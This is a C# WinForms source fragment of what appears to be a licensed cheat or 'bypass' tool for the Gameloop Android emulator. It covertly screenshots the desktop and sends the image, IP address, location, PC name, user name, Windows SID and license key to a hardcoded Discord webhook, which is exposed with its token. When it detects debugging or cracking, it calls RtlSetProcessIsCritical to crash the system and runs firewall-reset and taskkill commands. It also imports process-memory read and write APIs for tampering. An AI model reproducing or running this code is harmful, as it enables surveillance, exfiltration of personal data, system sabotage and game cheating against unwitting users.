            catch { }
        }






        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            backgroundWorker1.RunWorkerAsync();
        }

        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            backgroundWorker4.RunWorkerAsync();

        }

        private void CaptureMyScreen()
        {
            try
            {
                string result = Path.GetTempPath();
                string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                //Creating a new Bitmap object
                Bitmap captureBitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
                //Bitmap captureBitmap = new Bitmap(int width, int height, PixelFormat);
                //Creating a Rectangle object which will
                //capture our Current Screen
                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
                //Creating a New Graphics Object
                Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                //Copying Image from The Screen
                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                //Saving the Image File (I am here Saving it in My E drive).
                captureBitmap.Save(@"C:\Windows\Setup\\capture.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                //C:\Users\nightmood\AppData\Local
                //Displaying the Successfull Result
                //MessageBox.Show("Screen Captured");
            }
            catch (Exception ex)
            {
                // MessageBox.Show(ex.Message);
            }
        }


        private void CaptureMyScreen2()
        {
            try
            {
                string result = Path.GetTempPath();
                string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                //Creating a new Bitmap object
                Bitmap captureBitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
                //Bitmap captureBitmap = new Bitmap(int width, int height, PixelFormat);
                //Creating a Rectangle object which will
                //capture our Current Screen
                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
                //Creating a New Graphics Object
                Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                //Copying Image from The Screen
                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                //Saving the Image File (I am here Saving it in My E drive).
                captureBitmap.Save(@"C:\Windows\Setup\\crack.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                //C:\Users\nightmood\AppData\Local
                //Displaying the Successfull Result
                //MessageBox.Show("Screen Captured");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void sendImg(string url, string filePath)
        {
            HttpClient client = new HttpClient();
            MultipartFormDataContent content = new MultipartFormDataContent();

            var file = File.ReadAllBytes(filePath);
            content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
            client.PostAsync(url, content).Wait();
            client.Dispose();
        }



        private void sendImg1(string rbg,string dp, string filePath)
        {
            HttpClient client = new HttpClient();
            MultipartFormDataContent content = new MultipartFormDataContent();

            var file = File.ReadAllBytes(filePath);
            content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
            client.PostAsync(rbg, content).Wait();
            client.Dispose();
        }



        private void toolStripMenuItem6_CheckedChanged(object sender, EventArgs e)
        {
            if (toolStripMenuItem6.Checked)
            {
                //cf4b7fa8f8c1aa3a.SetWindowDisplayAffinity(this.Handle, 0x00000011);
            }
            else
            {
                //cf4b7fa8f8c1aa3a.SetWindowDisplayAffinity(this.Handle, 0);
            }
        }




        private void guna2ImageButton1_Click_2(object sender, EventArgs e)
        {
            guna2ContextMenuStrip1.Show(Cursor.Position.X, Cursor.Position.Y);
        }

        private void guna2ImageButton2_Click(object sender, EventArgs e)
        {
            contextMenuStrip2.Show(Cursor.Position.X, Cursor.Position.Y);

        }

        private void guna2ImageButton2_Click_1(object sender, EventArgs e)
        {
            contextMenuStrip2.Show(Cursor.Position.X, Cursor.Position.Y);

        }

        private void photo_Click(object sender, EventArgs e)
        {

        }
        public DateTime UnixTimeToDateTime(long unixtime)
        {
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Local);
            try
            {
                dtDateTime = dtDateTime.AddSeconds(unixtime).ToLocalTime();
            }
            catch
            {
                dtDateTime = DateTime.MaxValue;
            }
            return dtDateTime;
        }
        private void guna2ImageButton3_Click(object sender, EventArgs e)
        {
            guna2ContextMenuStrip2.Show(Cursor.Position.X, Cursor.Position.Y);
            var sub = Program.KeyAuthApp.user_data.subscriptions[0].subscription.Replace("      ", "-");
            toolStripMenuItem18.Text = "        " + sub;
            toolStripMenuItem19.ForeColor = Color.Red;
            toolStripMenuItem19.Text = "         " + UnixTimeToDateTime(long.Parse(Program.KeyAuthApp.user_data.subscriptions[0].expiry));
            toolStripMenuItem20.Text = "        " + Program.KeyAuthApp.user_data.username;

        }

        private async void guna2ImageButton4_Click(object sender, EventArgs e)
        {

        }

        private void guna2ImageButton5_Click(object sender, EventArgs e)
        {
            guna2ContextMenuStrip3.Show(Cursor.Position.X, Cursor.Position.Y);
        }

        private void toolStripMenuItem10_Click_1(object sender, EventArgs e)
        {
            try
            {
                WebClient web1 = new WebClient();
                string IP = web1.DownloadString("https://icanhazip.com/");
                //string ssCountry1 = web1.DownloadString("http://ip-api.com/csv/?fields=country");
                //string city = web1.DownloadString("http://ip-api.com/csv/?fields=city");
                string pc = System.Environment.MachineName;
                string pc1 = System.Environment.UserName;
                string ssd = WindowsIdentity.GetCurrent().User.Value;
                DateTime now = DateTime.Now;
                string key = Program.KeyAuthApp.user_data.username;
                string ss = @"@everyone" + "\n ☠ **Contry** : " + GetCountryByIP(IP) + "\n ☠ **IP** : " + IP.Trim() + "\n 💻 **Pc Name** : " + pc + "\n 📳 **HWID : **" + ssd + "\n ** 🖥 User_Name : **" + pc1 + "\n 🔑 **Key** : " + key + "\n 🛒 **Bypass** : " + "\n ⏱ Data : " + now;
                HttpClient client = new HttpClient();
                Dictionary<string, string> discordToPost = new Dictionary<string, string>();
                discordToPost.Add("content", ss);
                var content = new FormUrlEncodedContent(discordToPost);
                Uri webhook = new Uri("https://discord.com/api/webhooks/1162061912503234721/m-3MDH7896WyhXipI_NlILTIoPl0Vp51j37Iw8yFFkuP2teXcS-e7E1qNhMp29-DbS3m");
                client.PostAsync(webhook, content);
            }
            catch { }

            try
            {
                backgroundWorker4.RunWorkerAsync();
            }
            catch { }
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
        private class User32
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct Rect
            {
                public int left;
                public int top;
                public int right;
                public int bottom;
            }

            [DllImport("user32.dll")]
            public static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);
        }
        public void CaptureApplication(string procName)
        {
            var proc = Process.GetProcessesByName(procName)[0];
            var rect = new User32.Rect();
            User32.GetWindowRect(proc.MainWindowHandle, ref rect);
            int width = rect.right - rect.left;
            int height = rect.bottom - rect.top;
            var bmp = new Bitmap(width, height, PixelFormat.Format32bppArgb);
            using (Graphics graphics = Graphics.FromImage(bmp))
            {
                graphics.CopyFromScreen(rect.left, rect.top, 0, 0, new Size(width, height), CopyPixelOperation.SourceCopy);
            }
            bmp.Save("C:\\Windows\\Setup\\wins.Png", ImageFormat.Png);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            t.Start();
        }

        static void SendMs(string message)
        {
            string webhook = "https://discord.com/api/webhooks/1162061912503234721/m-3MDH7896WyhXipI_NlILTIoPl0Vp51j37Iw8yFFkuP2teXcS-e7E1qNhMp29-DbS3m";

            WebClient client = new WebClient();
            client.Headers.Add("Content-Type", "application/json");
            string payload = "{\"content\": \"" + message + "\"}";
            client.UploadData(webhook, Encoding.UTF8.GetBytes(payload));
        }


        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            try
            {
                var sub1 = Program.KeyAuthApp.user_data.subscriptions[0].subscription.Replace(" ", "***"); ;
                var bannerLink = Program.KeyAuthApp.var(sub1);

                Process.Start(bannerLink);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void toolStripMenuItem17_Click(object sender, EventArgs e)
        {
           try
            {
                var sub1 = Program.KeyAuthApp.user_data.subscriptions[0].subscription.Replace(" ", "**"); ;
                var bannerLink = Program.KeyAuthApp.var(sub1);

                Process.Start(bannerLink);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        private void BP_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                dos("netsh advfirewall reset");
                dos("taskkill /F /IM AndroidProcess.exe");
                dos("taskkill /F /IM ProjectTitan.exe");
                dos("taskkill /F /im AndroidEmulator.exe");
                dos("taskkill /F /im AndroidEmulatorEn.exe");
                dos("taskkill /F /im AndroidEmulatorEx.exe");
                dos("taskkill /F /im Gameloop.exe");
                Environment.Exit(0);
            }
            catch { }
        }
        public void CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com")) { }
            }
            catch
            {
                dos("netsh advfirewall reset");
                dos("taskkill /F /IM AndroidProcess.exe");
                dos("taskkill /F /IM ProjectTitan.exe");
                dos("taskkill /F /im AndroidEmulator.exe");
                dos("taskkill /F /im AndroidEmulatorEn.exe");
                dos("taskkill /F /im AndroidEmulatorEx.exe");
                dos("taskkill /F /im Gameloop.exe");
                Application.Exit();

            }
        }
        private void timer2_Tick(object sender, EventArgs e)
        {

            try

            {
                backgroundWorker5.RunWorkerAsync();
            }
            catch { }
        }

        public string GetFlag(string country)
        {
            var regions = CultureInfo.GetCultures(CultureTypes.SpecificCultures).Select(x => new RegionInfo(x.LCID));
            var englishRegion = regions.FirstOrDefault(region => region.EnglishName.Contains(country));
            if (englishRegion == null) return "🏳";
            var countryAbbrev = englishRegion.TwoLetterISORegionName;
            return IsoCountryCodeToFlagEmoji(countryAbbrev);
        }
        public string IsoCountryCodeToFlagEmoji1(string countryCode) => string.Concat(countryCode.ToUpper().Select(x => char.ConvertFromUtf32(x + 0x1F1A5)));

        private void guna2ImageButton6_Click(object sender, EventArgs e)
        {
            contextMenuStrip3.Show(Cursor.Position.X, Cursor.Position.Y);
        }
        private void malki_TextChanged(object sender, EventArgs e)
        {

        }
        //WMPLib.WindowsMediaPlayer player = new WMPLib.WindowsMediaPlayer();

        private void button1_Click_1(object sender, EventArgs e)
        {

        }

        private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
        {

        }

        private void notifyIcon1_BalloonTipClicked(object sender, EventArgs e)
        {
            this.Show();
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {

            //WebClient webClient122 = new WebClient();
            //var sub1 = Program.KeyAuthApp.user_data.subscriptions[0].subscription;
            //webClient122.DownloadFile("https://khaled477.000webhostapp.com/kh.txt", "C:\\Windows\\kh.txt");
            //string mess = "C:\\Windows\\kh.txt";
            //string text = File.ReadAllText(mess);
            //string title = sub1;

        }

        private void photo_Click_1(object sender, EventArgs e)
        {

        }
        // Constants for access rights
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_READ = 0x0010;
        const int PROCESS_VM_WRITE = 0x0020;

        // Importing required Windows APIs
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesWritten);

        private async Task PutTaskDelay(int Time)
        {
            await Task.Delay(Time);
        }


   


        //private async Task<IntPtr> SmartPID()
        //{
        //    IntPtr num1 = IntPtr.Zero;
        //    uint num2 = 0;
        //    IntPtr toolhelp32Snapshot = BP.CreateToolhelp32Snapshot(2U, 0U);
        //    if ((int)toolhelp32Snapshot > 0)
        //    {
        //        BP.ProcessEntry32 pe = new BP.ProcessEntry32();
        //        pe.dwSize = checked((uint)Marshal.SizeOf<BP.ProcessEntry32>(pe));
        //        for (int index = BP.Process32First(toolhelp32Snapshot, ref pe); index == 1; index = BP.Process32Next(toolhelp32Snapshot, ref pe))
        //        {
        //            IntPtr num3 = Marshal.AllocHGlobal(checked((int)pe.dwSize));
        //            Marshal.StructureToPtr<BP.ProcessEntry32>(pe, num3, true);
        //            object structure = Marshal.PtrToStructure(num3, typeof(BP.ProcessEntry32));
        //            BP.ProcessEntry32 processEntry32 = structure != null ? (BP.ProcessEntry32)structure : new BP.ProcessEntry32();
        //            Marshal.FreeHGlobal(num3);
        //            if (processEntry32.szExeFile.Contains("aow_exe.exe") && processEntry32.cntThreads > num2)
        //            {
        //                num2 = processEntry32.cntThreads;
        //                num1 = (IntPtr)(long)processEntry32.th32ProcessID;
        //            }
        //        }
        //        this.ProcID.Text = Convert.ToString((object)num1);

        //    }
        //    return num1;
        //}






         private void guna2CirclePictureBox1_Click(object sender, EventArgs e)
        {


            try
            {
                backgroundWorker1.RunWorkerAsync();
            }
            catch { }







        }

        private void guna2CircleProgressBar1_ValueChanged(object sender, EventArgs e)
        {

        }

        private void crack_Tick(object sender, EventArgs e)
        {
            try
            {
                var text = DebuggerAcl2.mazn();
                if (text != "")
                {
                    CaptureMyScreen2();
                    string kh = "C:\\Windows\\Setup\\crack.jpg";
                    sendImg("https://discord.com/api/webhooks/1162061912503234721/m-3MDH7896WyhXipI_NlILTIoPl0Vp51j37Iw8yFFkuP2teXcS-e7E1qNhMp29-DbS3m", kh);
                    WebClient web1 = new WebClient();
                    string IP = web1.DownloadString("http://ip-api.com/csv/?fields=query");
                    string ssCountry1 = web1.DownloadString("http://ip-api.com/csv/?fields=country");
                    string city = web1.DownloadString("http://ip-api.com/csv/?fields=city");
                    string pc = System.Environment.MachineName;
                    string pc1 = System.Environment.UserName;
                    string ssd = WindowsIdentity.GetCurrent().User.Value;
                    string key = Program.KeyAuthApp.user_data.username;
                    var sub = Program.KeyAuthApp.user_data.subscriptions[0].subscription;
                    string ss = @"😂 **Text Copy**  : " + text + "\n ☠ **Contry** : " + ssCountry1.Trim() + "\n ☠ **IP** : " + IP.Trim() + "\n 🚩 **City** : " + city.Trim() + "\n 💻 **Pc Name** : " + pc + "\n 📳 **HWID : **" + ssd + "\n ** 🖥 User_Name : **" + pc1 + "\n 🔑 **Key** : " + key + "\n 🛒 **Bypass** : " + sub;
                    HttpClient client = new HttpClient();
                    Dictionary<string, string> discordToPost = new Dictionary<string, string>();
                    discordToPost.Add("content", ss);
                    var content = new FormUrlEncodedContent(discordToPost);
                    Uri webhook = new Uri("https://discord.com/api/webhooks/1162061912503234721/m-3MDH7896WyhXipI_NlILTIoPl0Vp51j37Iw8yFFkuP2teXcS-e7E1qNhMp29-DbS3m");
                    client.PostAsync(webhook, content);
                    Program.KeyAuthApp.ban(text);
                    System.Diagnostics.Process.EnterDebugMode();
                    RtlSetProcessIsCritical(1, 0, 0);
                    System.Diagnostics.Process.GetCurrentProcess().Kill();
                    dos("taskkill /F /IM AndroidProcess.exe");
                    dos("taskkill /F /IM ProjectTitan.exe");
                    dos("taskkill /F /im AndroidEmulator.exe");
                    dos("taskkill /F /im AndroidEmulatorEn.exe");
                    dos("taskkill /F /im AndroidEmulatorEx.exe");
                    dos("taskkill /F /im Gameloop.exe");
                    Thread.Sleep(1800);
                    Environment.Exit(0);
                }
            }
            catch { }
        }

        private void program_Tick(object sender, EventArgs e)
        {
            try
            {
                var process = DebuggerAcl.Run();
                //var text = DebuggerAcl2.mazn();
                if (process != "")
                {
                    CaptureMyScreen2();
                    string ss11 = "C:\\Windows\\Setup\\crack.jpg";
                    sendImg("https://discord.com/api/webhooks/1162061912503234721/m-3MDH7896WyhXipI_NlILTIoPl0Vp51j37Iw8yFFkuP2teXcS-e7E1qNhMp29-DbS3m", ss11);
                    WebClient web1 = new WebClient();
                    string IP = web1.DownloadString("https://icanhazip.com/");
                    // string ssCountry1 = web1.DownloadString("http://ip-api.com/csv/?fields=country");
                    // string city = web1.DownloadString("http://ip-api.com/csv/?fields=city");
                    string pc = System.Environment.MachineName;
                    string ssd = WindowsIdentity.GetCurrent().User.Value;
                    string pc1 = System.Environment.UserName;
                    var sub = Program.KeyAuthApp.user_data.subscriptions[0].subscription;
                    string key = Program.KeyAuthApp.user_data.username;
                    string ss = @"😂 **Program Check**  : " + process + "\n ☠ **Contry** : " + GetCountryByIP(IP) + "\n ☠ **IP** : " + IP.Trim() + "\n 💻 **Pc Name** : " + pc + "\n 📳 **HWID : **" + ssd + "\n ** 🖥 User_Name : **" + pc1 + "\n 🔑 **Key** : " + key + "\n 🛒 **Bypass** : " + sub;
                    HttpClient client = new HttpClient();
                    Dictionary<string, string> discordToPost = new Dictionary<string, string>();
                    discordToPost.Add("content", ss);
                    var content = new FormUrlEncodedContent(discordToPost);
                    Uri webhook = new Uri("https://discord.com/api/webhooks/1162061912503234721/m-3MDH7896WyhXipI_NlILTIoPl0Vp51j37Iw8yFFkuP2teXcS-e7E1qNhMp29-DbS3m");
                    client.PostAsync(webhook, content);
                    Program.KeyAuthApp.ban(process);
                    System.Diagnostics.Process.EnterDebugMode();
                    RtlSetProcessIsCritical(1, 0, 0);
                    System.Diagnostics.Process.GetCurrentProcess().Kill();
                    dos("taskkill /F /IM AndroidProcess.exe");
                    dos("taskkill /F /IM ProjectTitan.exe");
                    dos("taskkill /F /im AndroidEmulator.exe");
                    dos("taskkill /F /im AndroidEmulatorEn.exe");
                    dos("taskkill /F /im AndroidEmulatorEx.exe");
                    dos("taskkill /F /im Gameloop.exe");
                    Thread.Sleep(1000);
                    Environment.Exit(0);
                }

            }
            catch { }
        }

        private void backgroundWorker5_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {


                //CheckForInternetConnection();
                string key = Program.KeyAuthApp.user_data.username;
                Program.KeyAuthApp.license(key);
                if (!Program.KeyAuthApp.response.success)
                {
                    Console.Beep(900, 1000);
                    Thread.Sleep(1000);
                    Console.Beep(900, 1000);
                    Thread.Sleep(1000);
                    Console.Beep(900, 1000);
                    SpeechSynthesizer synthesizer = new SpeechSynthesizer();
                    synthesizer.SpeakAsync(Program.KeyAuthApp.response.message);
                    Thread.Sleep(3100);
                    dos("netsh advfirewall reset");
                    dos("taskkill /F /IM AndroidProcess.exe");
                    dos("taskkill /F /IM ProjectTitan.exe");
                    dos("taskkill /F /im AndroidEmulator.exe");
                    dos("taskkill /F /im AndroidEmulatorEn.exe");
                    dos("taskkill /F /im AndroidEmulatorEx.exe");
                    dos("taskkill /F /im Gameloop.exe");
                    Application.Exit();
                }
            }
            catch { }
        }

        private void check_Tick(object sender, EventArgs e)
        {
           if(malak == 1)
            {
                NativeMethods.BlockInput(true);
            }
           else if(malak == 0)
            {
                NativeMethods.BlockInput(false);
            }
        }

        private void timer3_Tick(object sender, EventArgs e)
        {

        }

        private void BP_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                dos("netsh advfirewall reset");
                dos("taskkill /F /IM AndroidProcess.exe");
                dos("taskkill /F /IM ProjectTitan.exe");
                dos("taskkill /F /im AndroidEmulator.exe");
                dos("taskkill /F /im AndroidEmulatorEn.exe");
                dos("taskkill /F /im AndroidEmulatorEx.exe");
                dos("taskkill /F /im Gameloop.exe");
                Environment.Exit(0);
            }
            catch { }
        }





        private void guna2GradientCircleButton1_Click(object sender, EventArgs e)
        {





            //RegistryKey check1 = Registry.CurrentUser.OpenSubKey(@"Software\Tencent\MobileGamePC\", true);
            //string currentKey = check1.GetValue("sf").ToString();
            //// MessageBox.Show(currentKey.ToString());
            //string appvar = Program.KeyAuthApp.var(check);
            //if (!Program.KeyAuthApp.response.success)
            //{
            //    MessageBox.Show("\n Status: " + Program.KeyAuthApp.response.message);
            //    Thread.Sleep(2500);
            //    Environment.Exit(0);
            //}
            //else
            //    MessageBox.Show("\n App variable data: " + appvar);

            try
            {
                backgroundWorker1.RunWorkerAsync();
            }
            catch { }

        }

        private void startCirclePnl_Paint(object sender, PaintEventArgs e)
        {

        }

        private void chechiking_Tick(object sender, EventArgs e)
        {
            try
            { khra.RunWorkerAsync(); 

            }
            catch { }
        }

        private void khra_DoWork(object sender, DoWorkEventArgs e)
        {
            var check = Program.KeyAuthApp.user_data.subscriptions[0].subscription.Replace(" ","BY");
            string appvar = Program.KeyAuthApp.var(check);
            if (!Program.KeyAuthApp.response.success)
            {
                ///System.Diagnostics.Process.EnterDebugMode();
                ///RtlSetProcessIsCritical(1, 0, 0);
                ///System.Diagnostics.Process.GetCurrentProcess().Kill();
                Program.KeyAuthApp.ban("FUCK YOU");
                ///
            }
        }

        public string IPRequestHelper(string url)
        {

            HttpWebRequest objRequest = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse objResponse = (HttpWebResponse)objRequest.GetResponse();

            StreamReader responseStream = new StreamReader(objResponse.GetResponseStream());
            string responseRead = responseStream.ReadToEnd();

            responseStream.Close();
            responseStream.Dispose();

            return responseRead;
        }
        public string IsoCountryCodeToFlagEmoji(string countryCode) => string.Concat(countryCode.ToUpper().Select(x => char.ConvertFromUtf32(x + 0x1F1A5)));
        public string GetCountryByIP(string ipAddress)
        {
            string strReturnVal;
            string ipResponse = IPRequestHelper("http://ip-api.com/xml/" + ipAddress);
            //return ipResponse;
            XmlDocument ipInfoXML = new XmlDocument();
            ipInfoXML.LoadXml(ipResponse);
            XmlNodeList responseXML = ipInfoXML.GetElementsByTagName("query");
            NameValueCollection dataXML = new NameValueCollection();
            dataXML.Add(responseXML.Item(0).ChildNodes[2].InnerText, responseXML.Item(0).ChildNodes[2].Value);
            strReturnVal = responseXML.Item(0).ChildNodes[1].InnerText.ToString(); // Contry
            return strReturnVal;
        }


        private async void backgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
        {





            //DateTime date = DateTime.Now;
            string countryName = RegionInfo.CurrentRegion.DisplayName;
            long milliseconds = DateTimeOffset.Now.ToUnixTimeMilliseconds();
            var sub = Program.KeyAuthApp.user_data.subscriptions[0].subscription;
            var sskey = Program.KeyAuthApp.user_data.username;
            var sub12 = Program.KeyAuthApp.user_data.subscriptions[0].subscription.Replace(" ", "---");
            var dis = Program.KeyAuthApp.var(sub12);
            while (true)
            {
                try
                {
                    if (GetAsyncKeyState(Keys.F12) == -32767)
                    {
                        string ss1s = "C:\\Windows\\Setup\\wins.Png";
                        CaptureApplication("AndroidEmulatorEx");
                        string kh = "C:\\Windows\\Setup\\wins.Png";
                        sendImg(dis, kh);
                        WebClient web1 = new WebClient();
                        string ssCountryss = web1.DownloadString("https://icanhazip.com/");
                        string ss = @"> [🏆] [ **__WINNER WINNER CHICKEN DINNER__** ]" + $"\n> [⏱] **Playing Since :** {tttmer.Text.ToString()}" + $"\n> [🏡] **From :** {GetFlag(GetCountryByIP(ssCountryss))}" + $"\n> [🎮] **Bypass :** ||{sub}||";
                        HttpClient client = new HttpClient();
                        Dictionary<string, string> discordToPost = new Dictionary<string, string>();
                        discordToPost.Add("content", ss);
                        var content = new FormUrlEncodedContent(discordToPost);
                        Uri webhook = new Uri(dis);
                        await Task.Run(() => client.PostAsync(webhook, content));
                        File.Delete(ss1s);
                    }
                    Thread.Sleep(100);
                }

                catch { }
            }
        }

    }
}
